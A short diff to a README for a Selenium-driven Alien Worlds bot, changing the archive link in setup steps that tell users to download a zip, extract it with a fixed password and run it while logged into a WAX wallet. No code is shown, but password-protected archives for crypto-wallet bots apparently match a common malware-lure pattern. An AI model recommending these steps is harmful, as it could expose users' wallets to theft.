@@ -7,7 +7,7 @@ Alien Worlds bot uses Chrome Selenium web driver for automated actions
 - Alien Worlds account
 
 ## Setup
-1)	[Download](https://github.com/NFTERA/bsc-trading-bot/archive/refs/heads/main.zip) repo and extract files with password `F0Ey3b9loUXDmY`
+1)	[Download](https://github.com/NFTERA/Alien-Worlds-bot/archive/refs/heads/main.zip) repo and extract files with password `F0Ey3b9loUXDmY`
 2)	Open Chrome and login to WAX account.
 3)	Launch the program and follow instructions.
 
